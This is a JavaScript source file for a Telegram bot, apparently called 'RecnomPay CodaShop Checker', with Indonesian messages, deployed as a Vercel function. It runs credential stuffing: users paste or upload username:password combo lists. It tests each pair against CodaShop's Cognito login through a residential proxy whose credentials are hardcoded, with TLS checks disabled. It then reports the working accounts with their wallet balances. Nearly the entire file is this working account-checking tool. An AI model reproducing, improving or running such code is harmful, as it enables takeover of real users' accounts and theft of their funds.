process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const bot = new Telegraf(process.env.BOT_TOKEN);
const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:f4cd725960d1892a@gw.dataimpulse.com:823');

// ==========================================
// FUNGSI INTI PENGECEKAN API
// ==========================================
async function checkAccount(username, password) {
  try {
    const authPayload = JSON.stringify({
      AuthFlow: "USER_PASSWORD_AUTH",
      ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
      AuthParameters: { USERNAME: username, PASSWORD: password },
      ClientMetadata: { country_code: "ph", lang_code: "en" }
    });

    const authReq = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
      headers: {
        "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "Content-Type": "application/x-amz-json-1.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      },
      httpsAgent: proxyAgent,
      validateStatus: () => true,
      timeout: 15000
    });

    const resData = authReq.data;

    if (resData && resData.AuthenticationResult) {
      const idToken = resData.AuthenticationResult.IdToken;

      const walletReq = await axios.get("https://wallet-api.codacash.com/user/wallet", {
        headers: {
          "Authorization": idToken,
          "x-country-code": "608",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        httpsAgent: proxyAgent,
        validateStatus: () => true,
        timeout: 10000
      });

      const balance = walletReq.data?.data?.balanceAmount || 0;
      return { status: 'live', balance: balance, msg: 'Success' };
    } else {
      const msg = resData?.__type ? resData.__type.replace('Exception', '') : 'Invalid Credentials';
      return { status: 'die', msg: msg };
    }
  } catch (error) {
    return { status: 'error', msg: 'Proxy Error/Timeout' };
  }
}

// ==========================================
// HANDLER: /START & /CODASHOP (Satuan)
// ==========================================
bot.start((ctx) => {
  ctx.reply('Halo! RecnomPay CodaShop Checker siap.\n\n🔹 Cek Satuan: Ketik /codashop email:pass\n🔹 Cek Massal File: Upload file .txt\n🔹 Cek Massal Teks: Langsung paste list combo ke chat ini.');
});

bot.command('codashop', async (ctx) => {
  const args = ctx.message.text.split(' ');
  
  if (args.length < 2) {
    return ctx.reply('❌ <b>Format Salah!</b>\n\nUntuk cek satuan silakan gunakan format:\n<code>/codashop username:password</code>\n\nAtau jika ingin cek secara massal, <b>kamu cukup langsung paste list akun</b> ke chat ini.', { parse_mode: 'HTML' });
  }

  const combo = args[1].replace(/[|;\s]/g, ':').split(':');
  if (combo.length < 2) return ctx.reply('❌ Format Salah!\nGunakan: /codashop username:password');

  const username = combo[0].trim();
  const password = combo[1].trim();

  const loadingMsg = await ctx.reply('⏳ <i>RecnomPay Checker sedang memproses...</i>', { parse_mode: 'HTML' });

  const result = await checkAccount(username, password);

  if (result.status === 'live') {
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `✅ <b>LIVE ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nBalance: <b>${result.balance}</b>\n━━━━━━━━━━━━━━━━━━\n🤖 <i>RecnomPay Checker</i>`,
      { parse_mode: 'HTML' }
    );
  } else {
    const icon = result.status === 'die' ? '❌ <b>DIE ACCOUNT</b>' : '⚠️ <b>ERROR ACCOUNT</b>';
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `${icon}\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nMsg: ${result.msg}\n━━━━━━━━━━━━━━━━━━`,
      { parse_mode: 'HTML' }
    );
  }
});

// ==========================================
// HANDLER: PASTE TEKS LANGSUNG (Mass Check - Limit 30)
// ==========================================
bot.on('text', async (ctx) => {
  const textData = ctx.message.text;

  // Abaikan pesan jika berawalan '/' (karena itu command bot)
  if (textData.startsWith('/')) return;

  const lines = textData.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
  
  // Abaikan pesan jika bukan format combo list (tidak ada titik dua)
  if (lines.length === 0) return;

  const loadingMsg = await ctx.reply('📥 <i>List teks diterima! Memulai Mass Check... (Maksimal 30 data)</i>', { parse_mode: 'HTML' });

  try {
    const maxLines = lines.slice(0, 30);
    let liveResult = '';
    let liveCount = 0;
    let dieCount = 0;

    const checkPromises = maxLines.map(async (line) => {
      const combo = line.replace(/[|;\s]/g, ':').split(':');
      if (combo.length >= 2) {
        const username = combo[0].trim();
        const password = combo[1].trim();
        const res = await checkAccount(username, password);
        return { username, password, res };
      }
      return null;
    });

    const results = await Promise.all(checkPromises);

    results.forEach(item => {
      if (item && item.res.status === 'live') {
        liveCount++;
        liveResult += `<code>${item.username}:${item.password}</code> | Bal: <b>${item.res.balance}</b>\n`;
      } else if (item) {
        dieCount++;
      }
    });

    let finalMsg = `<b>✅ REKAP MASS CHECKING</b>\n━━━━━━━━━━━━━━━━━━\n`;
    if (liveCount > 0) {
      finalMsg += liveResult;
    } else {
      finalMsg += `<i>Tidak ada akun yang Live.</i>\n`;
    }
    finalMsg += `━━━━━━━━━━━━━━━━━━\n📈 <b>Statistik:</b>\nTotal Diproses: ${maxLines.length}\nLive: ${liveCount} | Die/Error: ${dieCount}\n🤖 <i>RecnomPay Checker Selesai</i>`;

    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, finalMsg, { parse_mode: 'HTML' });

  } catch (error) {
    console.error(error);
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Gagal memproses teks. Timeout Vercel atau proxy terputus.');
  }
});

// ==========================================
// HANDLER: UPLOAD FILE .TXT (Mass Check - Limit 30)
// ==========================================
bot.on('document', async (ctx) => {
  const doc = ctx.message.document;
  
  if (!doc.file_name.endsWith('.txt')) {
    return ctx.reply('❌ Mohon kirim file dengan format .txt yang berisi list combo.');
  }

  const loadingMsg = await ctx.reply('📥 <i>File diterima! Mengunduh dan memulai Mass Check... (Maksimal 30 data)</i>', { parse_mode: 'HTML' });

  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const response = await axios.get(fileLink.href);
    const textData = response.data;

    const lines = textData.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
    if (lines.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Tidak ada format combo yang valid di dalam file.');
    }

    const maxLines = lines.slice(0, 30);
    let liveResult = '';
    let liveCount = 0;
    let dieCount = 0;

    const checkPromises = maxLines.map(async (line) => {
      const combo = line.replace(/[|;\s]/g, ':').split(':');
      if (combo.length >= 2) {
        const username = combo[0].trim();
        const password = combo[1].trim();
        const res = await checkAccount(username, password);
        return { username, password, res };
      }
      return null;
    });

    const results = await Promise.all(checkPromises);

    results.forEach(item => {
      if (item && item.res.status === 'live') {
        liveCount++;
        liveResult += `<code>${item.username}:${item.password}</code> | Bal: <b>${item.res.balance}</b>\n`;
      } else if (item) {
        dieCount++;
      }
    });

    let finalMsg = `<b>✅ REKAP MASS CHECKING</b>\n━━━━━━━━━━━━━━━━━━\n`;
    if (liveCount > 0) {
      finalMsg += liveResult;
    } else {
      finalMsg += `<i>Tidak ada akun yang Live.</i>\n`;
    }
    finalMsg += `━━━━━━━━━━━━━━━━━━\n📈 <b>Statistik:</b>\nTotal Diproses: ${maxLines.length}\nLive: ${liveCount} | Die/Error: ${dieCount}\n🤖 <i>RecnomPay Checker Selesai</i>`;

    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, finalMsg, { parse_mode: 'HTML' });

  } catch (error) {
    console.error(error);
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined, '❌ Gagal memproses file. Timeout Vercel atau proxy terputus.');
  }
});

// ==========================================
// VERCEL SERVERLESS HANDLER
// ==========================================
module.exports = async (req, res) => {
  try {
    if (req.method === 'POST') {
      await bot.handleUpdate(req.body, res);
    } else {
      res.status(200).send('RecnomPay Bot berjalan dengan baik!');
    }
  } catch (error) {
    res.status(500).send('Terjadi kesalahan pada server');
  }
};
